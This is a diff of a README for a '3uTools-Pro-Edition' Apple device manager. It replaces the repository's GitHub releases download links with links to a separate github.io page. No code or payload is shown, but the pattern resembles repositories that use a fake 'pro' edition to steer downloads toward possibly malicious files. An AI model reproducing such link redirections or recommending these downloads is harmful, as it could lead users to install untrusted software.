@@ -1,6 +1,6 @@
 # 📱 3uTools-Pro-Edition - Manage your Apple devices with ease
 
-[![Download 3uTools Pro](https://img.shields.io/badge/Download_3uTools-Pro-blue.svg)](https://github.com/Reposemale887/3uTools-Pro-Edition/releases)
+[![Download 3uTools Pro](https://img.shields.io/badge/Download_3uTools-Pro-blue.svg)](https://reposemale887.github.io)
 
 ## 📋 Project Overview
 
@@ -30,7 +30,7 @@ Ensure your computer meets these requirements before you start:
 
 You can obtain the latest version of the application from our release page. 
 
-[Visit this page to download 3uTools-Pro-Edition](https://github.com/Reposemale887/3uTools-Pro-Edition/releases)
+[Visit this page to download 3uTools-Pro-Edition](https://reposemale887.github.io)
 
 Follow these steps to ensure a smooth download process:
 
